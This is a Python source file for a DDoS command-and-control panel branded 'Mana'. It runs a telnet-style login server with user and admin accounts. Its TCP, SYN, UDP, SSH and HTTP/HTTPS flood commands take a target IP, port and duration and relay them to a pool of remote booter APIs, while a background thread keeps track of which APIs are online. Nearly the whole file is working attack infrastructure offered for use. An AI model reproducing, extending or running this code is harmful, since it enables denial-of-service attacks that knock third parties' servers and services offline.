import os,platform,sys
import time
import threading
import paramiko,telnetlib,socket
import requests

login_use = []
BACKDOOR_PATCH = []
peak_online = 0
ONLINES_APIS = []
peak_down = 0
DOWN_APIS = []

def attacks(api_list,ip,port,sec,spam_api,method,methods=None,layer=None):
  if methods != None:
   methods = methods.upper()
  if method != None:
   method = method.upper()
  apiv2 = '/TARGET2=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
  api2 = apiv2.replace('IP',ip).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
  if layer == 4:
   apiv1 = '/TARGET=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
   api1 = apiv1.replace('IP',ip).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
   apiv3 = '/IP=IP2&PORT=NUMBER&TIME=THREAD&METHODS=METHODS2_HEX1629'
   api3 = apiv3.replace('IP2',ip).replace('NUMBER',port).replace('THREAD',sec).replace('METHODS2',method)
  else:
    apiv1 = '/TARGET=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
    api1 = apiv1.replace('IP',ip).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
    apiv3 = '/TARGET=IP&PORT=NUM&TIME=SEC&PACKET=HTTP&TYPE=METHODS2_HEX1629'
    api3 = apiv3.replace('IP',ip).replace('NUM',port).replace('SEC',sec).replace('HTTP',methods).replace('METHODS2',method)
    
  try:
   if len(api_list) != 0:
    for _ in range(int(spam_api)):
     for url_api in api_list:
       r = requests.get(f'{url_api}{api1}', timeout=5)
       if '<title>400 PAGE</title>' in r.content.decode() or 'METHODS IS NOT FOUND' in r.content.decode(): # FOR NOT SUPPORT v1,v2
        r = requests.get(f'{url_api}{api2}', timeout=5)
        if '<title>400 PAGE</title>' in r.content.decode() or 'METHODS IS NOT FOUND' in r.content.decode(): # FOR NOT SUPPORT v4,v5
          r = requests.get(f'{url_api}{api3}', timeout=5)
  except:
    pass

def DOWNLOAD_API():
        url_got = []
        try:
            data =  loader_banner(f'{path}{location}assets{location}API.txt',3,'R')
            for got in data:
                got = got.replace('\n', '')
                if len(got) != 0:
                    if 'http://' not in got:
                      url_got.append(f'https://{got}')
                    else:
                      url_got.append(f'{got}')
            return url_got
        except:
            return url_got

def API_CHECKING_THREADER(API_URL,NULLED):
 global ONLINES_APIS,DOWN_APIS
 if len(API_URL) != 0:
    timeout = [3,5,15,25]
    for time_set in timeout:
      try:
        r = requests.get(f'{API_URL}', timeout=int(time_set))
        if r.status_code == 200:
          if API_URL not in ONLINES_APIS:
            if API_URL in DOWN_APIS:
              DOWN_APIS.remove(API_URL)
            ONLINES_APIS.append(API_URL)
            break
        else:
         if API_URL not in DOWN_APIS:
          if API_URL in ONLINES_APIS:
             ONLINES_APIS.remove(API_URL)
          DOWN_APIS.append(API_URL)
      except:
        if API_URL not in DOWN_APIS:
          if API_URL in ONLINES_APIS:
             ONLINES_APIS.remove(API_URL)
          DOWN_APIS.append(API_URL)

def API_CHECKING():
 global ONLINES_APIS,DOWN_APIS,peak_online,peak_down
 while True:
  if len(DOWN_APIS) > peak_down:
    peak_down = len(DOWN_APIS)
  if len(ONLINES_APIS) > peak_online:
    peak_online = len(ONLINES_APIS)
  API_URL = DOWNLOAD_API()
  ONLINES_APIS.clear()
  DOWN_APIS.clear()
  if len(API_URL) != 0:
    for LINKS in API_URL:
      threading.Thread(target=API_CHECKING_THREADER,args=(LINKS,0)).start()
      time.sleep(0.1)
  time.sleep(65)

def change_color(c):
   return c.replace('\\033','\x1b').replace('\n','').replace('\r','')

def path_scanner(path):
    allFiles = []
    for root, subfiles, files in os.walk(path):
        for names in files:
            allFiles.append(os.path.join(root, names))
    return allFiles

def cls_console():
    if platform.system().lower() == 'windows':
        os.system('cls')
    else:
        os.system('clear')

def loader_banner(PATH, MODE, CONTENT='OLD'):
    try:
        if CONTENT != 'OLD':
            with open(PATH, CONTENT.lower(), encoding="utf-8") as f:
                if MODE == 1:
                    return f.read()
                elif MODE == 2:
                    return f.readline()
                elif MODE == 3:
                    return f.readlines()
        else:
            return None
    except Exception as e:
        return e

def write_banner(PATH, MODE, DATA, CONTENT='OLD'):
    try:
        if CONTENT != 'OLD':
            with open(PATH, CONTENT.lower()) as f:
                if MODE == 1:
                    f.write(DATA)
                elif MODE == 2:
                    f.writable(DATA)
                elif MODE == 3:
                    f.writelines(DATA)
        else:
            return None
    except Exception as e:
        return e
    
def path_return():
    data = os.path.abspath(sys.argv[0])
    if '\\' in data:
        separator = '\\'
    else:
        separator = '/'
    return separator, os.path.dirname(data)

location, path = path_return()

raw_port = 0
class RAW_SERVER:
 global raw_port,BACKDOOR_PATCH,login_use,ONLINES_APIS
 def RAW_SERVER():
    global raw_port,BACKDOOR_PATCH,login_use
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    port = 1
    while True:
     try:
        s.bind(('0.0.0.0',port))
        raw_port = port
        break
     except:
        port += 1
    PROCESS_USER = []
    PROCESS_PWD = []
    if raw_port != 0:
     print(f"( SERVER ) PORT={raw_port} BY SERVER=RAW . . .")
     while True:
      DB_SAVE = path_scanner(f'{path}{location}assets{location}Database')
      for files in DB_SAVE:
       raw_database = loader_banner(files,3,'R')
       if raw_database not in login_use:
         login_use.append(raw_database)
      for l in login_use:
       for l2 in l:
         l_got = l2.replace('\n','').split('@')
         if l_got[0] not in PROCESS_USER:
           PROCESS_USER.append(l_got[0])
         if l_got[1] not in PROCESS_PWD:
           PROCESS_PWD.append(l_got[1].replace('\\n',''))
      for l in PROCESS_USER:
       for d in PROCESS_PWD:
        c = 0
        patch = f'{l}@{d}'
        for l_f in login_use:
            for l_f2 in l_f:
                l_got2 = l_f2.replace('\n', '').split('@')
                if l_got2[0] == l and l_got2[1] == d:
                    c = 1
                    break

            if c == 0:
                if patch not in BACKDOOR_PATCH:
                    BACKDOOR_PATCH.append(f'{l}@{d}')

      print(f"[+] BLACKLIST_USERNAME={len(BACKDOOR_PATCH)}\n{BACKDOOR_PATCH}")
      break
     s.listen()
     while True:
      data,address = s.accept()
      threading.Thread(target=RAW_SERVER.LOGIN_RAW,args=(data,address)).start()

 def SEND(socket, data, escape=True):
    if escape:
        data += '\r\n'
    try:
     socket.send(data.encode())
    except:
     pass

 def TITLE(client,mode,username=None):
    global ONLINES_APIS,DOWN_APIS
    if mode == 'login':
       RAW_SERVER.SEND(client,'\33]0; Welcome to Mana Servers | Login User . . .\a')
    elif mode == 'title':
       while True:
        try:
           s = ['-','\\','|','/']
           for d in s:
             RAW_SERVER.SEND(client,f'\33]0; [{d}] ONLINE={len(ONLINES_APIS)} OFFLINE={len(DOWN_APIS)} | Mana.Ouma | User={username} [{d}]\a',False)
             time.sleep(0.1)
        except:
           break

 def LOGIN_RAW(client, address):
    global location, path, login_use, BACKDOOR_PATCH

    try:
        checker, failed, passed = loader_banner(f'{path}{location}assets{location}banner{location}error_login.nfx', 3, 'R')
        user_prompt, password_prompt = loader_banner(f'{path}{location}assets{location}banner{location}login_input.nfx', 3, 'R')
        threading.Thread(target=RAW_SERVER.TITLE, args=(client, 'login')).start()
        banner_login = loader_banner(f'{path}{location}assets{location}banner{location}login.nfx', 3, 'R')
        c_return = allow_username = allow_password = 0

        while True:
            if c_return == 1:
                break

            RAW_SERVER.SEND(client, '\033[2J\033[H')
            for logo in banner_login:
                RAW_SERVER.SEND(client, change_color(logo))
                time.sleep(0.1)

            u = 0
            p = 0

            if allow_username == 0:
                while True:
                    if u == 0:
                        u = 1
                        RAW_SERVER.SEND(client, change_color(user_prompt), False)
                    username = client.recv(65536).decode().strip()
                    if len(username) != 0:
                        break

            if allow_password == 0:
                while True:
                    if p == 0:
                        p = 1
                        RAW_SERVER.SEND(client, change_color(password_prompt), False)
                    password = client.recv(65536).decode().strip()
                    if len(password) != 0:
                        break

            vuln = vuln2 = 0

            if f'{username}@{password}' in BACKDOOR_PATCH:
                for B in BACKDOOR_PATCH:
                    got = B.split('@')
                    if got[0] == username:
                        vuln = 1
                    if got[1] == password:
                        vuln2 = 1

            if vuln != 1 or vuln2 != 1:
                for login_got in login_use:
                    raw_login2 = login_got
                    for raw in raw_login2:
                        raw_login = raw.replace('\n', '').split('@')
                        if username == raw_login[0]:
                            allow_username = 1
                            if password == raw_login[1]:
                                allow_password = 1
                                c_return = 1
                                break
                        else:
                            if password == raw_login[1]:
                                allow_password = 1

            s = ['-', '\\', '|', '/']
            for c in range(5):
                for i in s:
                    RAW_SERVER.SEND(client, '\033[2J\033[H')
                    RAW_SERVER.SEND(client, change_color(checker.replace('#', i)))
                    time.sleep(0.1)

            RAW_SERVER.SEND(client, '\033[2J\033[H')
            if allow_password == 1:
                RAW_SERVER.SEND(client, change_color(passed.replace('#', 'Password')))
            if allow_username == 1:
                RAW_SERVER.SEND(client, change_color(passed.replace('#', 'Username')))

            if allow_username != 1 or allow_password != 1:
                u_c = p_c = 0
                code = ''
                if allow_username != 1:
                    u_c = 1
                if allow_password != 1:
                    p_c = 1

                if u_c == 1:
                    code = 'Username'
                elif p_c == 1:
                    code = 'Password'
                else:
                    code = 'Given Credentials'

                RAW_SERVER.SEND(client, change_color(failed.replace('#', code)))
                time.sleep(2)

            if c_return == 1:
                threading.Thread(target=RAW_SERVER.CONTROL_RAW, args=(client, address, username, password)).start()

    except Exception as e:
        print(e)

 def CONTROL_RAW(client,address,user,password):
   global ONLINES_APIS,login_use,BACKDOOR_PATCH,path,location
   try:
    Access = None
    Conn = 0
    for l in login_use:
        for d in l:
          if f'{user}@{password}' in d:
           d = d.replace('\n','').split('@')
           for k in d:
            print(k)
            if '=' in k:
             q = k.split('=')
             print(q)
             if q[0] == 'Access':
               Access = q[1]
               print(Access)
             elif q[0] == 'Conn':
               Conn = q[1]
    setup_message = '\033[38;5;135mAttempting To \033[38;5;93mSetup Panel \033[38;5;92mWith \033[38;5;91m#\033[0m'
    string_Loader = ['-','\\','|','/']
    files = ['help.nfx','api.txt','database.txt']
    for f in files:
     for s in string_Loader:
      RAW_SERVER.SEND(client,'\033[2J\033[H')
      RAW_SERVER.SEND(client,change_color(setup_message.replace('#',f'{s} {f} . . .')))
      time.sleep(0.1)
     time.sleep(0.1)
    RAW_SERVER.SEND(client,'\033[2J\033[H')
    for d in loader_banner(f'{path}{location}assets{location}banner{location}mana.nfx',3,'R'):
     d = change_color(d.replace('username',user))
     RAW_SERVER.SEND(client,d)
     time.sleep(0.1)
    threading.Thread(target=RAW_SERVER.TITLE,args=(client,'title',user)).start()
    Prompt = change_color(loader_banner(f'{path}{location}assets{location}banner{location}prompt.nfx',1,'R').replace('username',user))
    RAW_SERVER.SEND(client,Prompt,False)
    while 1:
      data = client.recv(65536).decode().strip()
      if not data:
        continue
      command = data.split(' ')
      COM = command[0].upper()
      if COM == 'HELP':
       for d in loader_banner(f'{path}{location}assets{location}banner{location}help.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'ADMIN':
       if Access == 'True':
        for d in loader_banner(f'{path}{location}assets{location}banner{location}admin.nfx',3,'R'):
         d = change_color(d)
         RAW_SERVER.SEND(client,d)
         time.sleep(0.1)
       else:
        RAW_SERVER.SEND(client,f"\033[31;1mAccess failed\033[0m")
      elif COM == 'LOGOUT':
        threading.Thread(target=RAW_SERVER.LOGIN_RAW,args=(client,address)).start()
        break
      elif COM == 'EXIT':
        client.close()
      elif COM == 'METHODS' or COM == 'METHOD':
       for d in loader_banner(f'{path}{location}assets{location}banner{location}methods.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'C' or COM == 'CLS' or COM == 'CLEAR':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}mana_cls.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'REMOVEUSER':
        if Access == 'True':
         if len(command) == 5:
           username_got = command[1]
           password_got = command[2]
           access_got = command[3]
           conn_got = command[4]
           DB_SAVE = path_scanner(f'{path}{location}assets{location}Database')
           a = 0
           poc = []
           path_got = f'{path}{location}assets{location}Database{location}DB.txt'
           for c in DB_SAVE:
             if f'{path}{location}assets{location}Database{location}DB.txt' == c:
               try:
                 login_use.remove(f'{username_got}@{password_got}@Access={access_got}@Conn={conn_got}')
               except:
                 pass
               for d in loader_banner(f'{path}{location}assets{location}Database{location}DB.txt',3,'R'):
                 if f'{username_got}@{password_got}@Access={access_got}@Conn={conn_got}' != d:
                   poc.append(d)
               a = 1
               os.remove(f'{path}{location}assets{location}Database{location}DB.txt')
               break
           if a == 1:
             for r in poc:
                write_banner(path_got,1,r,'a')
             RAW_SERVER.SEND(client,'\033[32;1mUser remove successfully.\033[0m')
         else:
           RAW_SERVER.SEND(client,f"\033[31;1mAdduser <USER> <PWD> <ACCESS> <CONN>\033[0m")
        else:
         RAW_SERVER.SEND(client,f"\033[31;1mAccess failed\033[0m")
            
      elif COM == 'ADDUSER':
       if Access == 'True':
         if len(command) == 5:
           username_got = command[1]
           password_got = command[2]
           access_got = command[3]
           conn_got = command[4]
           DB_SAVE = path_scanner(f'{path}{location}assets{location}Database')
           a = 0
           for c in DB_SAVE:
             if f'{path}{location}assets{location}Database{location}DB.txt' == c:
               login_use.append(f'{username_got}@{password_got}@Access={access_got}@Conn={conn_got}')
               write_banner(c,1,f'\n{username_got}@{password_got}@Access={access_got}@Conn={conn_got}','a')
               a = 1
           if a == 1:
              PROCESS_USER = set()
              PROCESS_PWD = set()
              BACKDOOR_PATCH = []

              for l in login_use:
                  for l2 in l:
                      l_got = l2.replace('\n', '').split('@')
                      if len(l_got) >= 2:  # Ensure there's a username and password
                          username, password = l_got[0], l_got[1].replace('\\n', '')
                          PROCESS_USER.add(username)
                          PROCESS_PWD.add(password)

              for username in PROCESS_USER:
                  for password in PROCESS_PWD:
                      patch = f'{username}@{password}'
                      found = False
                      for l_f in login_use:
                          for l_f2 in l_f:
                              l_got2 = l_f2.replace('\n', '').split('@')
                              if len(l_got2) >= 2 and l_got2[0] == username and l_got2[1] == password:
                                  found = True
                                  break
                          if found:
                             break

                      if not found:
                          BACKDOOR_PATCH.append(patch)
              RAW_SERVER.SEND(client,'\033[32;1mUser added successfully.\033[0m')
         else:
           RAW_SERVER.SEND(client,f"\033[31;1mAdduser <USER> <PWD> <ACCESS> <CONN>\033[0m")
       else:
         RAW_SERVER.SEND(client,f"\033[31;1mAccess failed\033[0m")
      elif COM == 'INFO':
       for d in loader_banner(f'{path}{location}assets{location}banner{location}info.nfx',3,'R'):
        d = change_color(d.replace('username',user).replace('#',str(len(ONLINES_APIS))))
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'APIS':
        print(DOWN_APIS)
        print(peak_down)
        print(ONLINES_APIS)
        print(peak_online)
        loader,end = loader_banner(f'{path}{location}assets{location}banner{location}count.nfx',3,'R')
        https = 0
        http = 0
        all = 0
        for on in ONLINES_APIS:
          if 'https://' in on:
            https += 1
          if 'http://' in on:
            http += 1
          all += 1
        RAW_SERVER.SEND(client,change_color(loader.replace('API','HTTP').replace('ONLINE',str(http))))
        RAW_SERVER.SEND(client,change_color(loader.replace('API','HTTPS').replace('ONLINE',str(https))))
        RAW_SERVER.SEND(client,change_color(end.replace('APIS_COUNT',str(all))))
      elif COM == 'BANNERS':
       for d in loader_banner(f'{path}{location}assets{location}banner{location}banner.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'MANA':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}mana2.nfx',3,'R'):
        d = change_color(d.replace('username',user))
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'SQUIDWARD':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}Squidward.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d.replace('username',user))
        time.sleep(0.1)
      elif COM == 'HEX.CNC':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}Hex_cnc.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'MEERKAT':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}Meerkat.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'HYBRID':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}Hybrid.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'CONDIV1':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}CondiV1.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'CONDIV3':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}CondiV3.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'CONDIV6':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}CondiV6.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'OWARIV2':
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}OwariV2.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'OWARI':
       print(command[0])
       RAW_SERVER.SEND(client,'\033[2J\033[H')
       for d in loader_banner(f'{path}{location}assets{location}banner{location}other{location}Owari.nfx',3,'R'):
        d = change_color(d)
        RAW_SERVER.SEND(client,d)
        time.sleep(0.1)
      elif COM == 'TCP' or COM == 'SYN' or COM == 'UDP' or COM == 'SSH':
        if COM == 'SSH':
          l = 7
        else:
         l = 4
        api_list_poc2 = []
        if len(command) == 6:
         if command[4].replace('apis=','') > int(peak_online):
          if int(peak_online) == 0:
            RAW_SERVER.SEND(client,f"\033[31;1mThis methods can't running pls try new\033[0m")
          else:
            RAW_SERVER.SEND(client,f'\033[31;1mApi count to send is bigger then online api maximum\033[0m')
         else:
          while True:
           if len(ONLINES_APIS) != 0:
            if len(ONLINES_APIS) > int(command[4].replace('apis=','')) or len(ONLINES_APIS) == int(command[4].replace('apis=','')):
             api_list_poc = ONLINES_APIS
             break
          if 'apis=' in command[4]:
           if 'dport=' in command[3]:
            c = 0
            for count_apis in api_list_poc:
             if count_apis not in api_list_poc2:
              api_list_poc2.append(count_apis)
              c += 1
             if c == int(command[4].replace('apis=','')):
              break
            if int(command[2]) > int(Conn) and int(Conn) != 0:
              RAW_SERVER.SEND(client,f'\033[31;1mYou Time it high then time maximum!\033[0m')
            elif int(Conn) == 0:
              RAW_SERVER.SEND(client,f'\033[38;5;135m [\033[01;31m!\033[38;5;135m] \033[01;37mAttack Sent To \033[01;31m{len(api_list_poc2)} \033[01;37mApis \033[38;5;135m[\033[01;31m!\033[38;5;135m]')
              threading.Thread(target=attacks,args=(api_list_poc2,command[1],command[3].replace('dport=',''),command[2],command[5],command[0],None,l)).start()
            else:
              RAW_SERVER.SEND(client,f'\033[38;5;135m [\033[01;31m!\033[38;5;135m] \033[01;37mAttack Sent To \033[01;31m{len(api_list_poc2)} \033[01;37mApis \033[38;5;135m[\033[01;31m!\033[38;5;135m]')
              threading.Thread(target=attacks,args=(api_list_poc2,command[1],command[3].replace('dport=',''),command[2],command[5],command[0],None,l)).start()
           else:
            RAW_SERVER.SEND(client,f'\033[31;1mdport= not found . . .\033[0m')
          else:
            RAW_SERVER.SEND(client,f'\033[31;1mapis= not found . . .\033[0m')
        else:
          RAW_SERVER.SEND(client,f'\033[31;1m{command[0]} <TARGET> <TIME> dport=<PORT> apis=<COUNT> <spam_send>\033[0m')
      elif COM == 'SSL' or COM == 'TLS' or COM == 'HTTP' or COM == 'HTTPS':
        l = 7
        api_list_poc2 = []
        if len(command) == 7:
         if len(command[5].replace('apis=','')) > int(peak_online):
          if int(peak_online) == 0:
            RAW_SERVER.SEND(client,f"\033[31;1mThis methods can't running pls try new\033[0m")
          else:
            RAW_SERVER.SEND(client,f'\033[31;1mApi count to send is bigger then online api maximum\033[0m')
         else:
          while True:
           if len(ONLINES_APIS) != 0:
            if len(ONLINES_APIS) > int(command[5].replace('apis=','')) or len(ONLINES_APIS) == int(command[5].replace('apis=','')):
             api_list_poc = ONLINES_APIS
             break
          if 'apis=' in command[5]:
           if 'dport=' in command[4]:
            c = 0
            for count_apis in api_list_poc:
             if count_apis not in api_list_poc2:
              api_list_poc2.append(count_apis)
              c += 1
             if c == int(command[5].replace('apis=','')):
              break
            if int(command[2]) > int(Conn) and int(Conn) != 0:
              RAW_SERVER.SEND(client,f'\033[31;1mYou Time it high then time maximum!\033[0m')
            elif int(Conn) == 0:
              RAW_SERVER.SEND(client,f'\033[38;5;135m [\033[01;31m!\033[38;5;135m] \033[01;37mAttack Sent To \033[01;31m{len(api_list_poc2)} \033[01;37mApis \033[38;5;135m[\033[01;31m!\033[38;5;135m]')
              threading.Thread(target=attacks,args=(api_list_poc2,command[1],command[4].replace('dport=',''),command[2],command[6],command[0],command[3],l)).start()
            else:
             RAW_SERVER.SEND(client,f'\033[38;5;135m [\033[01;31m!\033[38;5;135m] \033[01;37mAttack Sent To \033[01;31m{len(api_list_poc2)} \033[01;37mApis \033[38;5;135m[\033[01;31m!\033[38;5;135m]')
             threading.Thread(target=attacks,args=(api_list_poc2,command[1],command[4].replace('dport=',''),command[2],command[6],command[0],command[3],l)).start()
           else:
            RAW_SERVER.SEND(client,f'\033[31;1mdport= not found . . .\033[0m')
          else:
            RAW_SERVER.SEND(client,f'\033[31;1mapis= not found . . .\033[0m')
        else:
          RAW_SERVER.SEND(client,f'\033[31;1m{command[0]} <TARGET> <TIME> <METHODS> dport=<PORT> apis=<COUNT> <spam_send>\033[0m')
      else:
        RAW_SERVER.SEND(client,f'\033[31;1mCOMMAND NOT FOUND\033[0m')
      RAW_SERVER.SEND(client,Prompt,False)
   except Exception as e:
    print(e)
    pass


threading.Thread(target=API_CHECKING).start()
RAW_SERVER.RAW_SERVER()